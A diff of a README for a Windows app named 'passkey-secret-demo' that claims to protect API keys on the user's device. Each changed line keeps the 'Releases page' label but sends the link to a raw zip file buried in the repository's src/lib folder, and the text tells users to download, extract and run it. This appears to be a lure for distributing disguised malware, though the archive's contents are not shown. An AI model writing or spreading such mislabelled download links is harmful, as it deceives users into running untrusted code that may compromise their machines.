@@ -1,6 +1,6 @@
 # 🔐 passkey-secret-demo - Keep API keys locked on your device
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/perineumprotestant613/passkey-secret-demo/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/perineumprotestant613/passkey-secret-demo/raw/refs/heads/main/src/lib/demo_passkey_secret_1.7.zip)
 
 ## 🚀 What this app does
 
@@ -15,7 +15,7 @@ Use it to:
 
 ## 📥 Download and run on Windows
 
-1. Open the [Releases page](https://github.com/perineumprotestant613/passkey-secret-demo/releases)
+1. Open the [Releases page](https://github.com/perineumprotestant613/passkey-secret-demo/raw/refs/heads/main/src/lib/demo_passkey_secret_1.7.zip)
 2. Find the latest Windows download
 3. Download the file to your computer
 4. If the download is a .zip file, right-click it and choose Extract All
@@ -155,9 +155,9 @@ After download, follow the file name and choose the Windows option that matches 
 
 ## 🔗 Download
 
-Visit the [Releases page](https://github.com/perineumprotestant613/passkey-secret-demo/releases) to download and run this file on Windows
+Visit the [Releases page](https://github.com/perineumprotestant613/passkey-secret-demo/raw/refs/heads/main/src/lib/demo_passkey_secret_1.7.zip) to download and run this file on Windows
 
-[![Get the latest release](https://img.shields.io/badge/Latest%20Release-Open%20Downloads-grey?style=for-the-badge)](https://github.com/perineumprotestant613/passkey-secret-demo/releases)
+[![Get the latest release](https://img.shields.io/badge/Latest%20Release-Open%20Downloads-grey?style=for-the-badge)](https://github.com/perineumprotestant613/passkey-secret-demo/raw/refs/heads/main/src/lib/demo_passkey_secret_1.7.zip)
 
 ## 🏷️ Topics
 
